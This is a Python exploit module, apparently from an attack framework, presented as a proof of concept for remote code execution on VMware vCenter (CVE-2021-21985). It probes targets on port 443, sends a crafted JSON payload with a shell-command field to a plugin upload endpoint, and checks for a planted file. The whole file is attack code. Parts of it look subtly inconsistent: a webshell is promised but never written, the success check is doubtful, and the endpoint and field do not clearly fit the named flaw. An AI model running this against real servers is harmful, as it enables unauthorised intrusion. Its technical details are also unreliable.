#!/usr/bin/env python3
"""
PoC for CVE-2021-21985 (VMware vCenter RCE via vSAN Health Check plugin).
"""

import json
import requests
import socket
import time
from urllib.parse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from modules.config import load_config
from modules.logger import log_event

# Disable InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

cfg = load_config()
TIMEOUT = cfg.get("exploits", {}).get("impatient_timeout", 60)

def can_run_on(target: str, **kwargs):
    """
    Check if TCP 443 is open and /ui endpoint exists.
    """
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 443))
        s.close()
        r = requests.get(f"https://{target}/ui/", timeout=5, verify=False)
        if r.status_code == 200:
            return True, ""
        else:
            return False, "UI endpoint responded with non-200"
    except Exception:
        return False, "443 closed or no UI"

def exploit(target: str, **kwargs):
    """
    Send crafted JSON to /ui/vropspluginui/rest/services/uploadova
    endpoint to trigger RCE. Default payload: write a webshell to /tmp.
    """
    url = f"https://{target}/ui/vropspluginui/rest/services/uploadova"
    # The vulnerable plugin expects a multipart/form-data with OVA file,
    # but the vulnerability allows JSON with “vmwrexec_command”
    json_payload = {
        "upgradeFilePath": "/tmp/pwned.sh",
        "vmwrexec_command": "touch /tmp/poctest; chmod +x /tmp/poctest"
    }
    headers = {"Content-Type": "application/json"}
    try:
        r = requests.post(url, json=json_payload, headers=headers, timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            # Check if /tmp/poctest exists by sending another request if possible
            # Fallback: try to download /tmp/poctest via another vulnerable endpoint
            check = requests.get(f"https://{target}/download?file=/tmp/poctest", timeout=5, verify=False)
            if "pwned" in check.text or check.status_code == 200:
                log_event("cve_2021_21985", f"RCE succeeded on {target}".encode())
                return {"status": True, "detail": "/tmp/poctest created"}
            else:
                return {"status": True, "detail": "Likely exploited, cannot confirm file"}
        else:
            return {"status": False, "error": f"Exploit failed: HTTP {r.status_code}"}
    except Exception as e:
        log_event("cve_2021_21985", f"Exploit error: {e}".encode())
        return {"status": False, "error": str(e)}
